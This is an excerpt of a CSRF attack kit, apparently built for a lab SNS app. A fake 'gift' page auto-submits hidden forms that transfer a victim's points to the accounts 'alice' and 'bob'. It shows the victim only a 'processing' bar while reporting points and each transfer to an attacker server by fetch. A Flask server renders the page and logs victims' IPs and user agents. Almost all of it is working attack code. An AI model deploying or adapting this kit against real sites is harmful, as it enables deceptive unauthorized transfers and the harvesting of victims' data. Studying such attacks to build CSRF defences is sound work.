...
<body>
    ...
    <script>
        ...
        console.log('[+] Fake Gift Page Loaded');
        console.log('[+] Target:', TARGET_SNS);
        console.log('[+] Attacker:', ATTACKER_SERVER);
        ...
        // CSRF 공격 실행
        (function() {
            const amounts = [5000, 3000, 2000, 1000, 500, 300, 100];
            const receivers = [{id: 2, name: 'alice'}, {id: 3, name: 'bob'}];
            ...
            // 공격자 서버에 피해자 정보 전송
            fetch(ATTACKER_SERVER + '/victim?points=' + totalPoints + '&forms=' + formIndex, {mode: 'no-cors'})
                .catch(() => {});
            ...
            for (let i = 0; i < totalForms; i++) {
                setTimeout(() => {
                    ...
                    if (form) {
                        ...
                        const amountIndex = Math.floor(i / receivers.length);
                        const progress = Math.round((submitted / totalForms) * 100);

                        // 진행률 업데이트 (피해자에게는 "처리 중"으로만 표시)
                        document.getElementById('progress').style.width = progress + '%';
                        document.getElementById('status').innerHTML = `처리 중... ${progress}%`;

                        // 콘솔에만 상세 정보 (개발자 도구)
                        console.log(`[+] Progress: ${submitted}/${totalForms} (${amounts[amountIndex]}P)`);

                        // 공격자 서버에 알림 (no-cors로 CORS 에러 방지)
                        fetch(ATTACKER_SERVER + '/transfer?amount=' + amounts[amountIndex] +
                              '&form=' + i, {mode: 'no-cors'}).catch(() => {});
                    }
                }, i * 300);
            }
...
def fake_gift():
    ...
    return render_template_string(
        FAKE_GIFT_HTML,
        target_ip=target_ip,
        attacker_server=f'http://{attacker_server}'
    )
...
def victim():
    ...
    forms = request.args.get('forms', 0)
    ...
    log_event(
        'victim',
        f'🎯 새 피해자 감지!',
        f'IP: {ip}, 예상 포인트: {points}P, User-Agent: {user_agent[:50]}...'
    )
...
if __name__ == '__main__':
    print("="*60)
    print("🎯 CSRF Attack Server Starting...")
    print("="*60)
    print("")
